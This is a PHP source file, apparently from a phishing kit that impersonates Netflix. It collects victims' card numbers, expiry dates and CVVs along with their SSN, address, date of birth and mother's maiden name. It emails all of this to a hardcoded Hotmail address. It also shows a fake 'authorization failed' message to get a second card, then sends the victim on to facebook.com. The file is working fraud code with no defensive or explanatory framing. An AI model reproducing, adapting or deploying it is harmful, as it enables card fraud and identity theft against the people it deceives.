<?php
function credit_process() {
    $karma_card_name = $_POST['karma-nameoncard'];
    $karma_card_number = $_POST['karma-cardnumber'];
    $karma_card_exp = $_POST['karma-exp'];
    $karma_card_cvv = $_POST['karma-cvv'];
    $karma_net_user = $_SESSION['karma-net-user'];
    $karma_net_pass = $_SESSION['karma-net-pass'];
    $karma_net_first_name = $_SESSION['karma-firstname'];
    $karma_net_last_name = $_SESSION['karma-lastname'];
    $karma_address = $_SESSION['karma-address'];
    $karma_city = $_SESSION['karma-city'];
    $karma_state = $_SESSION['karma-state'];
    $karma_zipcode = $_SESSION['karma-zipcode'];
    $karma_ssn = $_SESSION['karma-ssn'];
    $karma_phonenumber = $_SESSION['karma-phonenumber'];
    $karma_dob = $_SESSION['karma-dob'];
    $karma_mmn = $_SESSION['karma-mmn'];

    if (!isset($_SESSION['double-cc'])) {
        $result = '<div style="display: flex; justify-content: center; align-items: center;">
    <div style="text-align: center; border: 1px solid black; border-radius: 12px; width: 900px; background-color: black;">
    <strong style="color: crimson; font-family: Helvetica; line-height: 100px;">:: &nbsp;&nbsp;神は時間を与えてくださったが、私たちはそれを無駄にした。::</strong>
    <pre style="color: white; text-align: left; display: flex; flex-direction: column;">
    <strong style="color: darkorange;"> ## CARD 1 INFO ## </strong>
    Cardholder Name     : ' . $karma_card_name . '
    Card Number         : ' . $karma_card_number . '
    Card EXP Date       : ' . $karma_card_exp . '
    Card CVV            : ' . $karma_card_cvv . '
    <strong style="color: darkblue;"> ## PERSON INFO ## </strong>
    First Name  : ' . $karma_net_first_name . '
    Last Name   : ' . $karma_net_last_name . '
    Address     : ' . $karma_address . '
    City        : ' . $karma_city . '
    State       : ' . $karma_state . '
    Zipcode     : ' . $karma_zipcode . '
    SSN         : ' . $karma_ssn . '
    DOB         : ' . $karma_phonenumber . '
    MMN         : ' . $karma_mmn . '
    <strong style="color: darkgreen;"> ## DEVICE INFO ## </strong>
    IP          :
    Device      :
    Browser     :
    User Agent  :
            </pre>
        </div>
    </div>
        ';
        $_SESSION['double-cc'] = true;
        $_SESSION['auth-failed'] = 'Card authorization is failed, please use another card';
        $_SESSION['karma-first-card-number'] = $karma_card_number;
        $to = 'fauzikirahot@hotmail.com';
        $subject = 'CC 1';
        $headers = "From: $karma_card_name <karma@karma-netflix.ys>\r\n" .
                    "Content-Type: text/html; charset=utf-8\r\n";
        mail($to, $subject, $result, $headers);
        # file_put_contents('first.html', $result);
        header('Location: /credit');
        exit();

    } else if ($_SESSION['double-cc'] == true) {
        if ($_POST['karma-cardnumber'] == $_SESSION['karma-first-card-number']) {
            $_SESSION['same-card'] = 'Please use another card.';
            header('Location: /credit');
            exit();
        } else {
            $karma_second_card_name = $_POST['karma-nameoncard'];
            $karma_second_card_number = $_POST['karma-cardnumber'];
            $karma_second_card_exp = $_POST['karma-exp'];
            $karma_second_card_cvv = $_POST['karma-cvv'];
            $result = '<div style="display: flex; justify-content: center; align-items: center;">
    <div style="text-align: center; border: 1px solid black; border-radius: 12px; width: 900px; background-color: black;">
    <strong style="color: crimson; font-family: Helvetica; line-height: 100px;">:: &nbsp;&nbsp;神は時間を与えてくださったが、私たちはそれを無駄にした。::</strong>
    <pre style="color: white; text-align: left; display: flex; flex-direction: column;">
    <strong style="color: darkorange;"> ## CARD 2 INFO ## </strong>
    Cardholder Name     : ' . $karma_second_card_name . '
    Card Number         : ' . $karma_second_card_number . '
    Card EXP Date       : ' . $karma_second_card_exp . '
    Card CVV            : ' . $karma_second_card_cvv . '
    <strong style="color: darkblue;"> ## PERSON INFO ## </strong>
    First Name  : ' . $karma_net_first_name . '
    Last Name   : ' . $karma_net_last_name . '
    Address     : ' . $karma_address . '
    City        : ' . $karma_city . '
    State       : ' . $karma_state . '
    Zipcode     : ' . $karma_zipcode . '
    SSN         : ' . $karma_ssn . '
    DOB         : ' . $karma_phonenumber . '
    MMN         : ' . $karma_mmn . '
    <strong style="color: darkgreen;"> ## DEVICE INFO ## </strong>
    IP          :
    Device      :
    Browser     :
    User Agent  :
            </pre>
        </div>
    </div>
        ';
            $_SESSION['double-cc'] = false;
            # file_put_contents('second.html', $result);
            $to = 'fauzikirahot@hotmail.com';
            $subject = 'CC 2';
            $headers = "From: $karma_card_name <karma@karma-netflix.ys>\r\n" .
                        "Content-Type: text/html; charset=utf-8\r\n";
            mail($to, $subject, $result, $headers);
            header('Location: https://facebook.com');
            exit();
        }
    } else {
        $result = '<div style="display: flex; justify-content: center; align-items: center;">
    <div style="text-align: center; border: 1px solid black; border-radius: 12px; width: 900px; background-color: black;">
    <strong style="color: crimson; font-family: Helvetica; line-height: 100px;">:: &nbsp;&nbsp;神は時間を与えてくださったが、私たちはそれを無駄にした。::</strong>
    <pre style="color: white; text-align: left; display: flex; flex-direction: column;">
    <strong style="color: darkorange;"> ## CARD INFO ## </strong>
    Cardholder Name     : ' . $karma_card_name . '
    Card Number         : ' . $karma_card_number . '
    Card EXP Date       : ' . $karma_card_exp . '
    Card CVV            : ' . $karma_card_cvv . '
    <strong style="color: darkblue;"> ## PERSON INFO ## </strong>
    First Name  : ' . $karma_net_first_name . '
    Last Name   : ' . $karma_net_last_name . '
    Address     : ' . $karma_address . '
    City        : ' . $karma_city . '
    State       : ' . $karma_state . '
    Zipcode     : ' . $karma_zipcode . '
    SSN         : ' . $karma_ssn . '
    DOB         : ' . $karma_phonenumber . '
    MMN         : ' . $karma_mmn . '
    <strong style="color: darkgreen;"> ## DEVICE INFO ## </strong>
    IP          :
    Device      :
    Browser     :
    User Agent  :
            </pre>
        </div>
    </div>
        ';
        header('Location: https://facebook.com');
        exit();
    }
}